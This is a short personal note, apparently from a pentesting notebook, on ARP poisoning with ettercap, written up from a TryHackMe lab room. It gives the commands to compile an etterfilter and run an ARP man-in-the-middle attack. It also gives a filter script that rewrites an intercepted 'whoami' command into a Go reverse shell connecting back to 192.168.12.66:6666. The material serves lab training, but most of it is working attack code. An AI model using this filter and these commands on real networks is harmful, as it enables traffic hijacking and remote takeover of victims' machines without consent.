# ARP Poisoning

ARP Poisoning attack - consider reviewing [[MITM-Attacks]]

Perform packet manipulation of redirected packets from a target machine 


[etterfilter man page](https://linux.die.net/man/8/etterfilter) *"The etterfilter utility is used to compile source filter files into binary filter files that can be interpreted by the JIT interpreter in the [ettercap](https://linux.die.net/man/8/ettercap)(8) filter engine. You have to compile your filter scripts in order to use them in ettercap. All syntax/parse errors will be checked at compile time, so you will be sure to produce a correct binary filter for ettercap."*
```bash
# Apply filters 
# etterfilter.ef are compiled from etterfilter source filter files .ecf
# Compile etterfilter source filter file
etterfilter whoami.ecf -o whoami.ef
# Using etterfilters with -F 
# ettercap <>  -F whoami.ef
# Use the filter in a ARP poisoning attack
ettercap -T -i eth1 -M arp -F whoami.ef
```

In the [THM L2 MAC Flooding and ARP Spoofing Room](https://tryhackme.com/room/layer2) a pretend user Alice sends `whoami` over the wire which we are finding and replacing with a payload. This room reduces complexity assuming that there are no detection mechanisms.
```c
if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {
	log(DATA.data, "/root/ettercap.log");
	replace("whoami", "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.12.66:6666\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go &" );       
	msg("###### ETTERFILTER: substituted 'whoami' with reverse shell. ######\n");   
}
```


## References

[etterfilter man page](https://linux.die.net/man/8/etterfilter)
[THM L2 MAC Flooding and ARP Spoofing Room](https://tryhackme.com/room/layer2)